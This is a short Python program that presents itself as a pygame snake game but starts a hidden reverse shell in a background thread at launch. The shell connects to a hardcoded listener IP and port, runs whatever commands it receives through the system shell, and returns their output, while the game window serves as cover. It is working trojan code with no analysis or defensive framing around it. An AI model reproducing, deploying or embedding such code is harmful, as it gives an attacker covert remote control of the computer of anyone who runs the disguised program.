import pygame
import socket
import subprocess
import threading
import sys
import base64

# --- Reverse Shell Logic ---
def run_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        # Redirecting stdin/stdout/stderr to the socket
        while True:
            data = s.recv(1024).decode()
            if data.strip() == "exit": break
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
    except:
        pass

# --- Snake Game Logic ---
def run_game():
    pygame.init()
    win = pygame.display.set_mode((400, 400))
    clock = pygame.time.Clock()
    x, y = 200, 200
    vel = 10
    run = True
    while run:
        pygame.time.delay(100)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                run = False
        
        keys = pygame.key.get_pressed()
        if keys[pygame.K_LEFT]: x -= vel
        if keys[pygame.K_RIGHT]: x += vel
        
        win.fill((0, 0, 0))
        pygame.draw.rect(win, (255, 0, 0), (x, y, 10, 10))
        pygame.display.update()
    pygame.quit()

if __name__ == "__main__":
    # Configuration
    TARGET_IP = "192.168.1.100" # Change to your listener IP
    TARGET_PORT = 4444
    
    # Threading the shell so it doesn't block the game
    t = threading.Thread(target=run_shell, args=(TARGET_IP, TARGET_PORT))
    t.daemon = True
    t.start()
    
    run_game()
